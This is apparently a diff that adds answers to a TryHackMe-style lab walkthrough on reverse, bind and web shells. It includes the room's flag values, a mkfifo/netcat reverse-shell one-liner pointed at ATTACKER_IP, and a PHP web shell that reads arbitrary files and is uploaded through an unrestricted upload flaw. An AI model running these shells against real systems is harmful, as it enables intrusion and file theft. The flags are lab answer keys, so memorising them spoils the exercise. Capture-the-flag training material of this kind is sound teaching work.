@@ -389,11 +389,33 @@ Now that we have learned about the different types of reverse shells, let's test
 **Answer the questions below**⸻⸻⸻⸻⸻
 
 Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?
-**Answer:**
+**Answer:** THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
 **Reason:**
+1. Run \`nc -lvnp 8081\` in terminal.
+2. Go to \`http://TARGET_IP:8081\`.
+3. Run \`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f\`.
+4. You now have a reverse shell in your terminal.
+5. Run \`cd /\` to go to the root directory.
+6. Run \`ls\` to list all files and directories.
+7. Run \`cat flag.txt\` to read the flag.
+
 
 Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
-**Answer:**
+**Answer:** THM{202bb14ed12120b31300cfbbbdd35998786b44e5}
 **Reason:**
+1. Go to Terminal and run \`nano shell.php\`.
+2. Copy the code below into the file.
+\`\`\`
+<?php
+echo "<pre>";
+echo "File content:\n";
+$file = isset($_GET['file']) ? $_GET['file'] : '/flag.txt';
+echo @file_get_contents($file);
+echo "</pre>";
+?>
+\`\`\`
+3. Save the file by pressing \`CTRL+O\`, followed by pressing \`ENTER\`, and then exit the editor by pressing \`CTRL+X\`.
+4. Go to \`http://TARGET_IP:8082\` and upload the file.
+5. Go to \`http://TARGET_IP:8082/uploads/shell.php\`.
 `
 }
